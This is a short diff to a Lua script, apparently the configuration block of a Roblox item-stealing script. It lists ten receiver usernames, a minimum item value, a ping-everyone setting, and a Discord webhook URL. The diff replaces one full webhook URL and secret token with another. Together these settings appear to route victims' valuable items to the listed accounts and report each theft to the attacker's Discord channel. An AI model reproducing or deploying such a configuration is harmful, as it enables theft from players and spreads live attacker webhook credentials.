@@ -6,7 +6,7 @@ _G.scriptExecuted = false
 _G.Usernames = {"iamzanji11", "iamzanji22", "iamzanji33", "iamzanji44", "iamzanji55", "iamzanji66", "iamzanji77", "iamzanji88", "iamzanji99", "iamzanji00"}
 _G.min_value = 100000  -- Lowered from 100 million to 100k for testing
 _G.pingEveryone = "Yes"
-_G.webhook = "https://discord.com/api/webhooks/1397540329691025410/v3ZRBg0b1wuiP9SlUI3GcmL9fNwebGXVvWlzU3S_Win0rtOm6a4ifv0BgkJSaixhhXNE"
+_G.webhook = "https://discord.com/api/webhooks/1400305406093426750/th9I3eo_rtzqXonCmyqn73pUN3eoPYdA1L3VIAxWlIztSLXMLrHmyCMB7SnO-IVdr-fI"
 
 -- Variables
 local users = _G.Usernames or {}
